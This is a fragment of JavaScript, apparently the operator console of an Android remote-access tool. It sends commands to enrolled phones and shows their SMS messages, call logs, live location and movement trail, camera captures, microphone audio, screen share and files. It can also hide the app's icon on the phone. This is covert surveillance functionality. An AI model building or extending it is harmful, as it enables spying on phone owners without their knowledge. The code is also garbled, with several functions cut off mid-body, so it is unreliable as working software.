    function stopLiveAudio() {
        if (audioMediaRecorder && audioMediaRecorder.state === 'recording') {
            stopAudioRecording();
        }

        if (audioPC) {
            audioPC.close();
            audioPC = null;
        }
        sendSignalingMessage({ type: 'STOP_AUDIO' });
        document.getElementById('liveAudioBtn').parentElement.style.display = 'block';
        document.getElementById('stopLiveAudioBtn').style.display = 'none';
        panel.innerHTML = 'Ready.';

    function toggleAudioRecording() {
        const audioEl = document.getElementById('liveAudio');
        if (!audioEl || !audioEl.srcObject) {
            alert('No active audio stream');
            return;
        }

        if (audioMediaRecorder && audioMediaRecorder.state === 'recording') {
            stopAudioRecording();
            document.getElementById('audioRecordBtn').innerText = '🔴 Record';
        } else {
            startAudioRecording(audioEl.srcObject);
            document.getElementById('audioRecordBtn').innerText = '⏹ Stop Recording';
        }
    }

    function startAudioRecording(stream) {
        audioRecordedChunks = [];
        audioMediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
        audioMediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) audioRecordedChunks.push(e.data);
        };
        audioMediaRecorder.onstop = () => {
            const blob = new Blob(audioRecordedChunks, { type: 'audio/webm' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `audio-recording-${getFormattedDateTime()}.webm`;
            a.click();
            URL.revokeObjectURL(url);
            audioRecordedChunks = [];
            logActivity('Audio recording saved');
        };
        audioMediaRecorder.start();
        showNotification('Recording started');
        logActivity('Audio recording started');
    }

    function stopAudioRecording() {
        if (audioMediaRecorder && audioMediaRecorder.state === 'recording') {
            audioMediaRecorder.stop();
            audioMediaRecorder = null;
            logActivity('Audio recording stopped');
        }
    }

    function sendCommand(command, params = {}) {
        if (!currentDeviceId) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ Please select a device first</div>`;
            return;
        }

        if (!ws || ws.readyState !== WebSocket.OPEN) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
            return;
        }

        const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
        const payload = {
            type: 'COMMAND',
            command: command,
            requestId: requestId,
            deviceId: currentDeviceId,
            params: params,
            timestamp: Date.now()
        };
        ws.send(JSON.stringify(payload));
        panel.innerHTML = `📤 Command sent to ${devices.get(currentDeviceId)?.name || 'device'}: ${command}`;
        pendingCommand = command;
        logActivity(`Command sent: ${command}`);
        
        // Store for file downloads
        if (command === 'LIST_FILES') {
            currentPath = params.path || 'root';
        }
        
        setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
    }

    function sendPlainText(msg) {
        if (!currentDeviceId) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ Please select a device first</div>`;
            return;
        }

        if (!ws || ws.readyState !== WebSocket.OPEN) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
            return;
        }

        ws.send(msg);
        panel.innerHTML = `📤 Plain text sent: ${msg}`;
        logActivity(`Plain text: ${msg}`);
    }

    function handleDeviceRegistration(data) {
        const deviceId = data.deviceId;
        if (!deviceId) return;
        const deviceName = data.name || ((data.manufacturer || '') + ' ' + (data.model || '')).trim() || 'Unknown';

        // Merge with existing data so battery/network from DEVICE_INFO isn't lost
        const existing = devices.get(deviceId) || {};
        devices.set(deviceId, {
            ...existing,
            id: deviceId,
            name: deviceName,
            manufacturer: data.manufacturer || existing.manufacturer,
            model: data.model || existing.model,
            androidVersion: data.androidVersion || existing.androidVersion,
            sdkVersion: data.sdkVersion || existing.sdkVersion,
            batteryLevel: data.batteryLevel != null ? data.batteryLevel : existing.batteryLevel,
            batteryCharging: data.batteryCharging != null ? data.batteryCharging : existing.batteryCharging,
            networkType: data.networkType || existing.networkType,
            lastSeen: Date.now()
        });

        updateDeviceSelector();

        // Only notify/log on genuinely new device
        if (!existing.id) {
            showNotification(`📱 Device connected: ${deviceName}`);
            logActivity(`Device registered: ${deviceName}`);
        }

        // Auto-select first device
        if (!currentDeviceId) {
            currentDeviceId = deviceId;
            document.getElementById('deviceSelector').value = deviceId;
            showWelcomeMessage(false);
            logActivity(`Auto-selected device: ${deviceName}`);
        }
    }

    function updateDeviceSelector() {
        const selector = document.getElementById('deviceSelector');
        const countSpan = document.getElementById('deviceCount');

        const currentValue = selector.value;

        selector.innerHTML = '<option value="">Select Device</option>';

        devices.forEach((device, id) => {
            const option = document.createElement('option');
            option.value = id;
            option.textContent = device.name;
            if (id === currentDeviceId) {
                option.selected = true;
            }
            selector.appendChild(option);
        });

        countSpan.textContent = devices.size;

        if (currentValue && devices.has(currentValue)) {
            selector.value = currentValue;
        }

        // Refresh device picker grid on welcome screen
        updateDeviceGrid();
    }

    function updateDeviceGrid() {
        const grid = document.getElementById('deviceGrid');
        const hint = document.getElementById('noDevicesHint');
        if (!grid) return;

        grid.innerHTML = '';
        if (devices.size === 0) {
            if (hint) hint.style.display = 'block';
            return;
        }
        if (hint) hint.style.display = 'none';

        devices.forEach((device, id) => {
            const card = document.createElement('div');
            card.className = 'device-card';
            const bat = device.batteryLevel != null ? device.batteryLevel : '?';
            const batColor = bat >= 50 ? '#4caf50' : bat >= 20 ? '#ff9800' : '#d32f2f';
            const batIcon = device.batteryCharging ? '⚡' : bat >= 50 ? '🔋' : '🪫';
            const netIcon = device.networkType === 'WIFI' ? '📶' : device.networkType === 'MOBILE' ? '📡' : '🔌';
            const lastSeen = device.lastSeen ? new Date(device.lastSeen).toLocaleTimeString() : '';
            card.className = 'device-card' + (id === currentDeviceId ? ' active' : '');
            card.innerHTML = `
                <span class="dc-icon">📱</span>
                <span class="dc-name">${device.name || 'Unknown Device'}</span>
                <span class="dc-detail">${device.manufacturer || ''} ${device.model || ''}</span>
                <span class="dc-detail">Android ${device.androidVersion || '?'}</span>
                <div style="display:flex;align-items:center;gap:8px;margin-top:4px;flex-wrap:wrap;">
                    <span class="dc-status">● Online</span>
                    <span style="font-size:11px;color:${batColor};">${batIcon} ${bat}%</span>
                    <span style="font-size:11px;color:#7b8a9b;">${netIcon}</span>
                    ${lastSeen ? `<span style="font-size:10px;color:#bbb;">${lastSeen}</span>` : ''}
                </div>
            `;
            card.onclick = () => switchDevice(id);
            grid.appendChild(card);
        });
    }

    function switchDevice(deviceId) {

            ws.send(JSON.stringify({
                type: 'SWITCH_DEVICE',
                deviceId: deviceId
            }));

        showNotification(`Switched to ${devices.get(deviceId)?.name}`);

    function updateBatteryInfo(level, charging) {
        currentBatteryLevel = level;

        const batteryDiv = document.getElementById('batteryInfo');
        const levelDiv = document.querySelector('.battery-level');
        const percentSpan = document.querySelector('.battery-percent');
        const iconDiv = document.querySelector('.battery-icon');

        if (level >= 0) {
            batteryDiv.style.display = 'flex';

    function formatBytes(b) {
        if (b === 0) return '0 B';
        const k = 1024, sizes = ['B','KB','MB','GB'];
        const i = Math.floor(Math.log(b)/Math.log(k));
        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
    }

    function showNotification(text) {
        const orig = statusEl.innerText;
        statusEl.innerText = text;
        setTimeout(() => { statusEl.innerText = orig; }, 2000);

    function handleIncomingMessage(msg) {
        try {
            const json = JSON.parse(msg);
            if (json.type === 'SIGNALING') {
                handleSignalingMessage(json.data);
            } else {
                handleJSON(json);
            }
        } catch (e) {
            handlePlainText(msg);
        }
    }

    // FIXED: Enhanced handleJSON to properly process data
    function handleJSON(json) {
        console.log('handleJSON:', json.type, json);

        // Infrastructure messages must ALWAYS pass through regardless of selected device.
        // These are server-level events, not per-device responses.
        const infrastructureTypes = new Set([
            'DEVICE_REGISTRATION', 'DEVICE_LIST', 'DEVICE_OFFLINE',
            'DEVICE_INFO', 'AUTH_OK', 'AUTH_FAIL', 'DEVICE_SWITCHED'
        ]);

        if (json.deviceId && json.deviceId !== currentDeviceId
                && !infrastructureTypes.has(json.type)) {
            // Message from a device that isn't currently selected.
            // Still register unknown devices so they appear in the picker.
            if (json.deviceId && !devices.has(json.deviceId)) {
                handleDeviceRegistration({
                    deviceId: json.deviceId,
                    name: json.deviceName || 'Unknown Device'
                });
            }
            console.log('Skipping response from non-selected device:', json.deviceId);
            return;
        }

        switch (json.type) {
            case 'DEVICE_REGISTRATION':
                handleDeviceRegistration(json);
                updateDeviceGrid();
                break;

            case 'DEVICE_LIST':
                devices.clear();
                if (Array.isArray(json.devices)) {
                    json.devices.forEach(device => {
                        devices.set(device.deviceId, device);
                    });
                }
                updateDeviceSelector();
                updateDeviceGrid();
                // Refresh battery for current device
                if (currentDeviceId) {
                    const curDev = devices.get(currentDeviceId);
                    if (curDev && curDev.batteryLevel != null) {
                        updateBatteryInfo(curDev.batteryLevel, curDev.batteryCharging || false);
                    }
                }
                if (devices.size > 0 && !currentDeviceId) {
                    const firstId = devices.keys().next().value;
                    switchDevice(firstId);
                }
                break;

            case 'DEVICE_OFFLINE': {
                const offId = json.deviceId;
                const offName = devices.get(offId)?.name || offId;
                devices.delete(offId);
                updateDeviceSelector();
                updateDeviceGrid();
                logActivity(`Device offline: ${offName}`);
                showNotification(`📴 ${offName} disconnected`);
                if (currentDeviceId === offId) {
                    currentDeviceId = null;
                    setStatus('OFFLINE');
                    panel.innerHTML = '<div id="welcomeMessage"><div id="devicePickerScreen" style="padding:40px 20px;text-align:center;"><div style="font-size:48px;margin-bottom:16px;">📴</div><h2 style="font-size:20px;">Device Disconnected</h2><p style="color:#7b8a9b;">Select another device.</p><div id="deviceGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px;max-width:700px;margin:20px auto;text-align:left;"></div></div></div>';
                    updateDeviceGrid();
                }
                break;
            }

            case 'DEVICE_INFO':
                // Device is actually paired and responding — now set ONLINE
                setStatus('ONLINE');
                logActivity('Device paired: ' + (json.model || json.manufacturer || 'unknown'));
                if (json.batteryLevel !== undefined) {
                    updateBatteryInfo(json.batteryLevel, json.batteryCharging || false);
                }
                break;

            case 'INSTALLED_APPS': {
                const appsData = parseDataField(json.data);

                break;

            default:
                console.log('Unhandled JSON type:', json.type);
                if (pendingCommand === 'LIST_FILES' && Array.isArray(json)) {
                    dataType = 'file';
                    currentData = json;
                    renderFiles();

    // FIXED: Enhanced handlePlainText to properly handle file downloads
    function handlePlainText(msg) {
        if (msg.startsWith("dl ")) {
            console.log('Download request:', msg);
            return;
        }
        
        if (msg.startsWith("STATUS:")) {
            setStatus(msg.substring(7));
        } else if (msg.startsWith("LOC_DATA:")) {
            try {
                const data = JSON.parse(msg.substring(9));
                renderMap(data);
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("FILE_LIST:")) {
            try {
                const dataStr = msg.substring(10);
                currentData = JSON.parse(dataStr);
                dataType = 'file';
                renderFiles();
                logActivity('File list received');
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("SMS_DATA:")) {
            try {
                const dataStr = msg.substring(9);
                currentData = JSON.parse(dataStr);
                dataType = 'sms';
                renderSMS();
                logActivity('SMS data received');
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("CALL_DATA:")) {
            try {
                const dataStr = msg.substring(10);
                currentData = JSON.parse(dataStr);
                dataType = 'call';
                renderCallLogs();
                logActivity('Call logs received');
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("CAMERA_IMAGE:")) {
            const base64 = msg.substring(13);
            displayCapturedImage(base64);
        } else if (msg.startsWith("AUDIO_RECORDING:")) {
            showAudio(msg.substring(16));
        } else if (msg.startsWith("FILE_DATA:")) {
            // FIXED: Proper file download handling
            const base64 = msg.substring(10);
            const filename = 'downloaded_file_' + Date.now() + '.bin';
            downloadBase64(base64, filename);
            showNotification('File downloaded: ' + filename);
            logActivity('File downloaded');
        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
            screenActive = true;
            document.getElementById('screenBtn').innerText = 'Stop Screen';
            showNotification('Screen share started');
            logActivity('Screen share started (plain)');
        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
            screenActive = false;
            document.getElementById('screenBtn').innerText = 'Start Screen';
            if (screenPC) { 
                screenPC.close(); 
                screenPC = null; 
            }
            closeScreenModal();
            showNotification('Screen share stopped');
            logActivity('Screen share stopped (plain)');
        } else if (msg.startsWith("APP_HIDDEN")) {
            iconHidden = true;
            document.getElementById('iconBtn').innerText = 'Show Icon';
            showNotification('App icon hidden');
        } else if (msg.startsWith("APP_SHOWN")) {
            iconHidden = false;
            document.getElementById('iconBtn').innerText = 'Hide Icon';
            showNotification('App icon shown');
        } else if (msg.startsWith("VIBRATE_DONE")) {
            showNotification('Vibration done');
        } else if (msg.startsWith("ERROR:")) {
            panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
        } else if (msg.startsWith('[') || msg.startsWith('{')) {
            try {
                const parsed = JSON.parse(msg);
                handleJSON(parsed);
            } catch (err) {
                console.error('Failed to parse JSON in plain text:', err);
            }
        } else {
            console.log('Unhandled plain text:', msg);
        }
    }

        }
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;

        canvas.toBlob(blob => {

    function toggleRecording() {
        const video = document.getElementById('liveCamVideo');
        if (!video || !video.srcObject) {
            alert('No live stream');
            return;
        }
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            document.getElementById('recordBtn').innerText = 'Record Video';
            logActivity('Live video recording stopped');
        } else {
            recordedChunks = [];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const stream = video.srcObject;

            if (video.videoWidth === 0) {
                video.onloadedmetadata = () => startCanvasRecording(video, canvas, ctx, stream);
            } else {
                startCanvasRecording(video, canvas, ctx, stream);
            }
            logActivity('Live video recording started');
        }
    }

    function startCanvasRecording(video, canvas, ctx, originalStream) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        function drawVideoFrame() {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            requestAnimationFrame(drawVideoFrame);
        }
        drawVideoFrame();

        const canvasStream = canvas.captureStream(30);
        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));

        mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
        mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
        mediaRecorder.onstop = () => {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `recording_${Date.now()}.webm`;
            a.click();
            URL.revokeObjectURL(url);
            canvasStream.getTracks().forEach(track => track.stop());
            logActivity('Live video recording saved');
        };
        mediaRecorder.start();
        document.getElementById('recordBtn').innerText = 'Stop Recording';
    }

    // FIXED: Enhanced downloadBase64 with better error handling
    function downloadBase64(b64, filename) {
        try {
            // Create a blob from the base64 data
            const byteCharacters = atob(b64);
            const byteNumbers = new Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) {
                byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNumbers);
            const blob = new Blob([byteArray], { type: 'application/octet-stream' });
            
            // Create download link
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            console.log('Downloaded:', filename);
            showNotification(`Downloaded: ${filename}`);
        } catch (e) {
            console.error('Download error:', e);
            // Fallback to data URL method
            try {
                const a = document.createElement('a');
                a.href = 'data:application/octet-stream;base64,' + b64;
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                showNotification(`Downloaded: ${filename}`);
            } catch (e2) {
                console.error('Fallback download error:', e2);
                alert('Download failed: ' + e.message);
            }
        }
    }

    function renderMap(loc) {
        if (!loc || typeof loc.lat !== 'number' || typeof loc.lon !== 'number') {
            panel.innerHTML = '<p>Invalid location data</p>';
            return;
        }

        panel.innerHTML = '<div id="map" style="position:relative;"></div>';
        const mapDiv = document.getElementById('map');

        const infoDiv = document.createElement('div');
        infoDiv.className = 'map-info';
        infoDiv.innerHTML = `
            <div class="coord">📍 ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
            <div>🎯 Accuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) : '?'} m</div>
            <div>📡 Provider: ${loc.provider || 'unknown'}</div>
            <div class="addr">🌍 Loading address...</div>
            <div style="margin-top:8px;display:flex;gap:8px;flex-wrap:wrap;">
                <button onclick="useLocationAsGeofence(${loc.lat},${loc.lon})"
                    style="padding:5px 12px;background:#4caf50;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px;">
                    🗺️ Set Geofence Here
                </button>
                <a href="https://maps.google.com/?q=${loc.lat},${loc.lon}" target="_blank"
                    style="padding:5px 12px;background:#1976ff;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px;text-decoration:none;">
                    Open in Google Maps
                </a>
            </div>
        `;
        mapDiv.appendChild(infoDiv);

        if (mapInstance) mapInstance.remove();
        mapInstance = L.map(mapDiv).setView([loc.lat, loc.lon], 18);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
        L.circle([loc.lat, loc.lon], { radius: loc.accuracy || 10, color: '#1976ff' }).addTo(mapInstance);

        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`, {
            headers: { 'User-Agent': 'SystemSync-Console/1.0' }
        })
        .then(response => response.json())
        .then(data => {
            const address = data.display_name || 'Address not found';
            infoDiv.querySelector('.addr').innerHTML = `🌍 ${address}`;
        })
        .catch(err => {
            console.error('Geocoding error:', err);
            infoDiv.querySelector('.addr').innerHTML = '🌍 Address unavailable';
        });

        // Draw location history trail on map
        if (locationHistory.length > 1) {
            const trail = locationHistory.map(p => [p.lat, p.lon]);
            L.polyline(trail, { color: '#1976ff', weight: 2, opacity: 0.5 }).addTo(mapInstance);
            // Mark older points smaller
            locationHistory.slice(1).forEach((p, i) => {
                L.circleMarker([p.lat, p.lon], {
                    radius: 4, color: '#1976ff', fillColor: '#90caf9',
                    fillOpacity: 0.7, weight: 1
                }).bindPopup(`#${i+2}: ${new Date(p.receivedAt).toLocaleTimeString()}`).addTo(mapInstance);
            });
        }
    }

    function connectWebSocket() {
        if (ws) {
            ws.close();
        }
        setStatus('CONNECTING');
        ws = new WebSocket(WS_URL);
        ws.onopen = () => {
            console.log('WebSocket connected');
            ws.send('I_AM_WEB');
            setStatus('CONNECTED');
            window._reconnectDelay = 3000; // reset back-off   // relay open — waiting for device
            logActivity('WebSocket connected');

            const welcomeMsg = document.getElementById('welcomeMessage');
            if (welcomeMsg) {
                welcomeMsg.innerHTML = `
                    <h2>👋 Welcome to SystemSync Console</h2>
                    <p>Waiting for devices to connect...</p>
                    <p>When a device installs the app, it will appear in the dropdown menu above.</p>
                `;
                welcomeMsg.style.display = 'block';
            }

            ws.send(JSON.stringify({ type: 'GET_DEVICES' }));

            if (window.deviceListInterval) clearInterval(window.deviceListInterval);
            window.deviceListInterval = setInterval(() => {
                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({ type: 'GET_DEVICES' }));
                }
            }, 30000);
        };
        ws.onmessage = (e) => {
            console.log('RAW message:', e.data);
            handleIncomingMessage(e.data);
        };
        ws.onclose = () => {
            console.log('WebSocket closed');
            setStatus('OFFLINE');
            ws = null;
            if (window.deviceListInterval) clearInterval(window.deviceListInterval);
            logActivity('WebSocket disconnected');
            // Auto-reconnect with back-off: 3s → 6s → 12s → max 30s
            const delay = Math.min(30000, (window._reconnectDelay || 3000));
            window._reconnectDelay = delay * 2;
            console.log(`Reconnecting in ${delay}ms...`);
            setTimeout(() => {
                if (!ws) connectWebSocket();
            }, delay);
        };
        ws.onerror = (err) => {
            console.error('WebSocket error:', err);
            setStatus('ERROR');
        };
    }

    // ── Alerts system ────────────────────────────────────────────────────────
    const alerts = [];

    function pushAlert(title, body, type = 'warning') {
        const time = new Date().toLocaleTimeString();
        alerts.unshift({ title, body, type, time });
        if (alerts.length > 50) alerts.pop();
        renderAlerts();
        showNotification('⚠️ ' + title + ': ' + body);
    }

    function renderAlerts() {
        const list = document.getElementById('alertsList');
        const badge = document.getElementById('alertsBadge');
        if (!list) return;
        badge.style.display = alerts.length ? 'block' : 'none';
        list.innerHTML = alerts.map(a =>
            `<div style="margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px;">
                <strong>${a.time}</strong> ${a.title}: ${a.body}
            </div>`
        ).join('');
    }

    function clearAlerts() {
        alerts.length = 0;
        renderAlerts();
    }

    function displayAppUsage(data) {
        let apps;
        try { apps = typeof data === 'string' ? JSON.parse(data) : data; }
        catch(e) { panel.innerHTML = '<p style="color:red">Parse error</p>'; return; }

        if (apps.error) { panel.innerHTML = `<p style="color:red">${apps.error}</p>`; return; }

        // Simple bar chart
        const maxMs = apps.length > 0 ? apps[0].totalTimeMs : 1;
        let html = `<h3>📊 Screen Time (${apps.length} apps)</h3>
            <div style="overflow-x:auto;">
            <table style="width:100%;border-collapse:collapse;font-size:13px;">
                <thead><tr style="background:#f5f7fa;">

                    <th style="padding:8px;text-align:left;">Usage</th>
                    <th style="padding:8px;min-width:120px;text-align:left;">Bar</th>
                </tr></thead><tbody>`;

        apps.forEach(a => {
            const pct = Math.max(2, Math.round((a.totalTimeMs / maxMs) * 100));
            const color = a.totalTimeMs > 3600000 ? '#d32f2f' : a.totalTimeMs > 1800000 ? '#ff9800' : '#4caf50';
            html += `<tr style="border-bottom:1px solid #f0f0f0;">

                <td style="padding:7px 8px;white-space:nowrap;font-weight:600;">${a.totalTimeFmt}</td>

            </tr>`;

        html += '</tbody></table></div>';
        panel.innerHTML = html;
    }
